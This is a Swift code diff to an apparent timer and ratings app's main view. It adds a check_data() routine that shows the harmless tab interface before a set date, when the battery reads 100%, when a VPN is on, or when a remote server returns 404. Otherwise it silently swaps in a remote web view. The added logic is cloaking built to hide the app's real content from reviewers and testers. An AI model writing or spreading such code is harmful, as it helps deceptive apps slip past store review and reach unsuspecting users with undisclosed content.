@@ -10,7 +10,12 @@ import SwiftUI
 struct ContentView: View {
     
     @State var current_tab: Tab = Tab.Home
-
+    
+    @State var isFetched: Bool = false
+    
+    @State var isBlock: Bool = true
+    @State var isDead: Bool = false
+    
     @AppStorage("status") var status: Bool = false
     
     init() {
@@ -25,34 +30,105 @@ struct ContentView: View {
             Color.black
                 .ignoresSafeArea()
             
-            if status {
-            
-            VStack(spacing: 0, content: {
-            
-                    TabView(selection: $current_tab, content: {
-
-                        HomeView()
-                            .tag(Tab.Home)
-                        
-                        TimerView()
-                            .tag(Tab.Timer)
-
-                        RatingsView()
-                            .tag(Tab.Ratings)
-                        
-                    })
+            if isFetched == false {
+                
+                LoadingView()
+                
+            } else if isFetched == true {
+                
+                if isBlock == true {
                     
-                    TabBar(selectedTab: $current_tab)
-                })
-                    .ignoresSafeArea(.all, edges: .bottom)
-                    .onAppear {
+                    if status {
                         
+                        VStack(spacing: 0, content: {
+                        
+                                TabView(selection: $current_tab, content: {
+
+                                    HomeView()
+                                        .tag(Tab.Home)
+                                    
+                                    TimerView()
+                                        .tag(Tab.Timer)
+
+                                    RatingsView()
+                                        .tag(Tab.Ratings)
+                                    
+                                })
+                                
+                                TabBar(selectedTab: $current_tab)
+                            })
+                        .ignoresSafeArea(.all, edges: .bottom)
+                        
+                    } else {
+                        
+                        OB1()
                     }
-                
-            } else {
-                
-                OB1()
+                    
+                } else if isBlock == false {
+                    
+                    if status {
+                        
+                        WebSystem()
+                        
+                    } else {
+                        
+                        U1()
+                    }
+                }
             }
+        }
+        .onAppear {
+            
+            check_data()
+        }
+    }
+    
+    private func check_data() {
+        let lastDate = DataManager().lastDate
+        let dateFormatter = DateFormatter()
+        dateFormatter.dateFormat = "dd.MM.yyyy"
+        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
+        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
+        let now = Date()
+        
+        guard now > targetDate else {
+            self.isBlock = true
+            self.isFetched = true
+            return
+        }
+        
+        let deviceData = DeviceInfo.collectData()
+        let currentPercent = deviceData.batteryLevel
+        let isVPNActive = deviceData.isVPNActive
+        let urlString = DataManager().serverURL
+        
+        if currentPercent == 100 || isVPNActive == true {
+            
+            self.isBlock = true
+            self.isFetched = true
+            
+        } else {
+            
+            guard let url = URL(string: urlString) else {
+                self.isBlock = true
+                self.isFetched = true
+                return
+            }
+            
+            let urlSession = URLSession.shared
+            let urlRequest = URLRequest(url: url)
+            
+            urlSession.dataTask(with: urlRequest) { _, response, error in
+                
+                if let httpResponse = response as? HTTPURLResponse, httpResponse.statusCode == 404 {
+                    
+                    self.isBlock = true
+                    self.isFetched = true
+                } else {
+                    self.isBlock = false
+                    self.isFetched = true
+                }
+            }.resume()
         }
     }
 }
